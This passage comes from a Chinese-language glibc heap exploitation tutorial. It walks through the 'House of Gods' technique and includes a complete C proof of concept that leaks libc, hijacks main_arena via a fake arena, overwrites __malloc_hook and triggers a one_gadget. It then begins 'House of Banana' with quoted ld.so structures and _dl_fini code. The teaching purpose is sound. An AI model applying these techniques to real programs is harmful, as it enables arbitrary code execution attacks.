<p>因此我们可以修改 <code>main_arena.next</code> 指向伪造的 <code>arena</code> 然后<strong>两次</strong>调用 <code>malloc(0xffffffffffffffbf + 1);</code> 通过 <code>checked_request2size(bytes, nb);</code> 宏使得 <code>_int_malloc</code> 返回 NULL，最终使得 <code>thread_arena</code> 指向我们伪造的 <code>arena</code> 。具体过程如下：</p>
<p>首先需要确保 <code>narenas &gt; narenas_limit - 1</code> 从而调用 <code>reused_arena</code> ，因此要构造 unsorted bin attack 将 <code>narenas</code> 改成一个较大的数。</p>
<ul>
<li>为了确保从 unsorted bin 中取出的 chunk 能通过 <code>victim-&gt;size &gt; av-&gt;system_mem</code> 检查，我们将 <code>main_arena.system_mem</code> 赋值为 0xffffffffffffffff 。</li>
<li>将 <code>INTM.bk</code> 指向 <code>&amp;narenas - 0x10</code> 构造 unsorted bin attack 。</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/5d5ab77efb8ef664ee277095ad929a90.png"
                     
                ><br>将 <code>INTM</code> 申请出来，此时 <code>arenas</code> 上被写入了 <code>&amp;main_arena.top</code> 。</p>
<p>将 <code>main_arena.next</code> 指向 <code>INTM</code> ，连续两次 <code>malloc(0xffffffffffffffbf + 1);</code> 将<code>thread_arena</code> 指向我们伪造的 <code>INTM</code> ：</p>
<ul>
<li>第一次 <code>malloc(0xffffffffffffffbf + 1);</code> 使得 <code>thread_arena</code> 指向 <code>main_arena</code> ，<code>next_to_use</code> 指向 <code>INTM</code> 。</li>
<li>第一次 <code>malloc(0xffffffffffffffbf + 1);</code> 使得 <code>thread_arena</code> 指向 <code>INTM</code> 。</li>
</ul>
<p>之后将 <code>*(uint64_t*) (INTM+0x30)</code> 指向伪造的 chunk ，此时如果 <code>malloc(0x68)</code> 就会将目标地址处的内存申请出来。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/d9e59dc2cab49ed4aa3347a08d1e2678.png"
                     
                ><br><a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_gods" >poc<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">void</span> *SMALLCHUNK = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">    <span class="type">void</span> *FAST20 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="type">void</span> *FAST40 = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] leak libc base.&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(SMALLCHUNK);</span><br><span class="line">    <span class="type">uint64_t</span> leak = *((<span class="type">uint64_t</span> *) SMALLCHUNK);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] set binmap.&quot;</span>);</span><br><span class="line">    <span class="type">void</span> *INTM = <span class="built_in">malloc</span>(<span class="number">0x98</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijack main_arena.&quot;</span>);</span><br><span class="line">    SMALLCHUNK = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">    <span class="built_in">free</span>(SMALLCHUNK);</span><br><span class="line">    *((<span class="type">uint64_t</span> *) (SMALLCHUNK + <span class="number">0x8</span>)) = leak + <span class="number">0x7f8</span>;</span><br><span class="line">    *((<span class="type">uint64_t</span> *) (FAST40 + <span class="number">0x8</span>)) = (<span class="type">uint64_t</span>) (INTM - <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(FAST20);</span><br><span class="line">    <span class="built_in">free</span>(FAST40);</span><br><span class="line">    <span class="type">void</span> *BINMAP = <span class="built_in">malloc</span>(<span class="number">0x1f8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] switch to fake arena.&quot;</span>);</span><br><span class="line">    *((<span class="type">uint64_t</span> *) (INTM + <span class="number">0x8</span>)) = leak - <span class="number">0xa40</span>;</span><br><span class="line">    *((<span class="type">uint64_t</span> *) (BINMAP + <span class="number">0x20</span>)) = <span class="number">0xffffffffffffffff</span>;</span><br><span class="line">    INTM = <span class="built_in">malloc</span>(<span class="number">0x98</span>);</span><br><span class="line">    *((<span class="type">uint64_t</span> *) (BINMAP + <span class="number">0x8</span>)) = (<span class="type">uint64_t</span>) (INTM - <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xffffffffffffffbf</span> + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xffffffffffffffbf</span> + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] arbitrary address alloc.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *((<span class="type">uint64_t</span> *) (INTM + <span class="number">0x20</span>)) = leak - <span class="number">0x8b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijack __malloc_hook.&quot;</span>);</span><br><span class="line">    <span class="type">void</span> *FAKECHUNK = <span class="built_in">malloc</span>(<span class="number">0x68</span>);</span><br><span class="line">    *(<span class="type">uint64_t</span> *) (FAKECHUNK + <span class="number">0x13</span>) = leak - <span class="number">0x2c5f71</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger one_gadget.&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x114514</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="House-of-Banana"><a href="#House-of-Banana" class="headerlink" title="House of Banana"></a>House of Banana</h1><p>在 ld.so 中定义了一个类型为 rtld_global 的全局变量 _rtld_global 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This is the structure which defines all variables global to ld.so</span></span><br><span class="line"><span class="comment">   (except those which cannot be added for some reason).  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span> _<span class="title">rtld_global</span> =</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Get architecture specific initializer.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dl-procruntime.c&gt;</span></span></span><br><span class="line">    <span class="comment">/* Generally the default presumption without further information is an</span></span><br><span class="line"><span class="comment">     * executable stack but this is not true for all platforms.  */</span></span><br><span class="line">    ._dl_stack_flags = DEFAULT_STACK_PERMS,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC_REENTRANT</span></span><br><span class="line">    ._dl_load_lock = _RTLD_LOCK_RECURSIVE_INITIALIZER,</span><br><span class="line">    ._dl_load_write_lock = _RTLD_LOCK_RECURSIVE_INITIALIZER,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    ._dl_nns = <span class="number">1</span>,</span><br><span class="line">    ._dl_ns =</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC_REENTRANT</span></span><br><span class="line">      [LM_ID_BASE] = &#123; ._ns_unique_sym_table</span><br><span class="line">		       = &#123; .lock = _RTLD_LOCK_RECURSIVE_INITIALIZER &#125; &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure></div>

<p>其中 rtld_global 类型部分定义如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">/* Don&#x27;t change the order of the following elements.  &#x27;dl_loaded&#x27;</span></span><br><span class="line"><span class="comment">     must remain the first element.  Forever.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Non-shared code has no support for multiple namespaces.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> DL_NNS 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> DL_NNS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  EXTERN <span class="class"><span class="keyword">struct</span> <span class="title">link_namespaces</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* A pointer to the map for the main map.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *_<span class="title">ns_loaded</span>;</span></span><br><span class="line">    <span class="comment">/* Number of object in the _dl_loaded list.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> _ns_nloaded;</span><br><span class="line">    <span class="comment">/* Direct pointer to the searchlist of the main object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> *_<span class="title">ns_main_searchlist</span>;</span></span><br><span class="line">    <span class="comment">/* This is zero at program start to signal that the global scope map is</span></span><br><span class="line"><span class="comment">       allocated by rtld.  Later it keeps the size of the map.  It might be</span></span><br><span class="line"><span class="comment">       reset if in _dl_close if the last global object is removed.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> _ns_global_scope_alloc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* During dlopen, this is the number of objects that still need to</span></span><br><span class="line"><span class="comment">       be added to the global scope map.  It has to be taken into</span></span><br><span class="line"><span class="comment">       account when resizing the map, for future map additions after</span></span><br><span class="line"><span class="comment">       recursive dlopen calls from ELF constructors.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> _ns_global_scope_pending_adds;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Once libc.so has been loaded into the namespace, this points to</span></span><br><span class="line"><span class="comment">       its link map.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">libc_map</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Search table for unique objects.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">unique_sym_table</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      __rtld_lock_define_recursive (, lock)</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">unique_sym</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line">	<span class="type">uint32_t</span> hashval;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">	<span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span></span><br><span class="line">      &#125; *entries;</span><br><span class="line">      <span class="type">size_t</span> size;</span><br><span class="line">      <span class="type">size_t</span> n_elements;</span><br><span class="line">      <span class="type">void</span> (*<span class="built_in">free</span>) (<span class="type">void</span> *);</span><br><span class="line">    &#125; _ns_unique_sym_table;</span><br><span class="line">    <span class="comment">/* Keep track of changes to each namespace&#x27; list.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_debug</span> _<span class="title">ns_debug</span>;</span></span><br><span class="line">  &#125; _dl_ns[DL_NNS];</span><br><span class="line">  <span class="comment">/* One higher than index of last used namespace.  */</span></span><br><span class="line">  EXTERN <span class="type">size_t</span> _dl_nns;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure></div>

<p>这里只需要关注 link_namespaces 类型的数组 _dl_ns[DL_NNS] 和该数组中有效元素的数量 _dl_nns 以及 link_map 类型的指针 _ns_loaded 和该指针指向的链表元素数量 _ns_nloaded 。</p>
<p>link_map 相关结构如下：<br>其中主要关注的是 l_addr，l_next，l_real，l_info[DT_FINI_ARRAY]（l_info[26]），l_info[DT_FINI_ARRAYSZ]（l_info[28]），l_init_called。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* These first few members are part of the protocol with the debugger.</span></span><br><span class="line"><span class="comment">       This is the same format used in SVR4.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Addr) l_addr;		<span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">				   file and the addresses in memory.  */</span></span><br><span class="line">    <span class="type">char</span> *l_name;		<span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;		<span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* All following members are internal to the dynamic linker.</span></span><br><span class="line"><span class="comment">       They may change without notice.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This is an element which is only ever different from a pointer to</span></span><br><span class="line"><span class="comment">       the very same copy of this type for ld.so when it is used in more</span></span><br><span class="line"><span class="comment">       than one namespace.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of the namespace this link map belongs to.  */</span></span><br><span class="line">    Lmid_t l_ns;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line">    <span class="comment">/* Indexed pointers to dynamic section.</span></span><br><span class="line"><span class="comment">       [0,DT_NUM) are indexed by the processor-independent tags.</span></span><br><span class="line"><span class="comment">       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VERSIONTAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by</span></span><br><span class="line"><span class="comment">       DT_EXTRATAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VALTAGIDX(tagvalue) and</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)</span></span><br><span class="line"><span class="comment">       are indexed by DT_ADDRTAGIDX(tagvalue), see &lt;elf.h&gt;.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">		      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Phdr)</span> *l_phdr;	<span class="comment">/* Pointer to program header table in core.  */</span></span><br><span class="line">    ElfW(Addr) l_entry;		<span class="comment">/* Entry point location.  */</span></span><br><span class="line">    ElfW(Half) l_phnum;		<span class="comment">/* Number of program header entries.  */</span></span><br><span class="line">    ElfW(Half) l_ldnum;		<span class="comment">/* Number of dynamic segment entries.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Array of DT_NEEDED dependencies and their dependencies, in</span></span><br><span class="line"><span class="comment">       dependency order for symbol lookup (with and without</span></span><br><span class="line"><span class="comment">       duplicates).  There is no entry before the dependencies have</span></span><br><span class="line"><span class="comment">       been loaded.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> <span class="title">l_searchlist</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We need a special searchlist to process objects marked with</span></span><br><span class="line"><span class="comment">       DT_SYMBOLIC.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> <span class="title">l_symbolic_searchlist</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Dependent object that first caused this object to be loaded.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_loader</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Array with version names.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">l_versions</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_nversions;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Symbol hash table.  */</span></span><br><span class="line">    Elf_Symndx l_nbuckets;</span><br><span class="line">    Elf32_Word l_gnu_bitmask_idxbits;</span><br><span class="line">    Elf32_Word l_gnu_shift;</span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Addr)</span> *l_gnu_bitmask;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="type">const</span> Elf32_Word *l_gnu_buckets;</span><br><span class="line">      <span class="type">const</span> Elf_Symndx *l_chain;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="type">const</span> Elf32_Word *l_gnu_chain_zero;</span><br><span class="line">      <span class="type">const</span> Elf_Symndx *l_buckets;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_direct_opencount; <span class="comment">/* Reference count for dlopen/dlclose.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span>			/* <span class="title">Where</span> <span class="title">this</span> <span class="title">object</span> <span class="title">came</span> <span class="title">from</span>.  */</span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line">	lt_executable,		<span class="comment">/* The main executable program.  */</span></span><br><span class="line">	lt_library,		<span class="comment">/* Library needed by main executable.  */</span></span><br><span class="line">	lt_loaded		<span class="comment">/* Extra run-time loaded shared object.  */</span></span><br><span class="line">      &#125; l_type:<span class="number">2</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_relocated:<span class="number">1</span>;	<span class="comment">/* Nonzero if object&#x27;s relocations done.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_init_called:<span class="number">1</span>; <span class="comment">/* Nonzero if DT_INIT function called.  */</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></div>

<p>在 _dl_fini 函数中有对 _dl_ns 数组以及 _dl_ns 中的链表 _ns_loaded 的遍历，主要逻辑如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">      __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">      <span class="comment">/* No need to do anything for empty namespaces or those used for</span></span><br><span class="line"><span class="comment">	 auditing DSOs.  */</span></span><br><span class="line">      <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">	  || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	  )</span><br><span class="line">	__rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Now we can allocate an array to hold all the pointers and</span></span><br><span class="line"><span class="comment">	     copy the pointers in.  */</span></span><br><span class="line">	  <span class="keyword">struct</span> link_map *maps[nloaded];</span><br><span class="line"></span><br><span class="line">	  <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">	  assert (nloaded != <span class="number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line">	  <span class="keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">	    <span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line">	    <span class="keyword">if</span> (l == l-&gt;l_real)</span><br><span class="line">	      &#123;</span><br><span class="line">		assert (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">		maps[i] = l;</span><br><span class="line">		l-&gt;l_idx = i;</span><br><span class="line">		++i;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">		   are not dlclose()ed from underneath us.  */</span></span><br><span class="line">		++l-&gt;l_direct_opencount;</span><br><span class="line">	      &#125;</span><br><span class="line">	  assert (ns != LM_ID_BASE 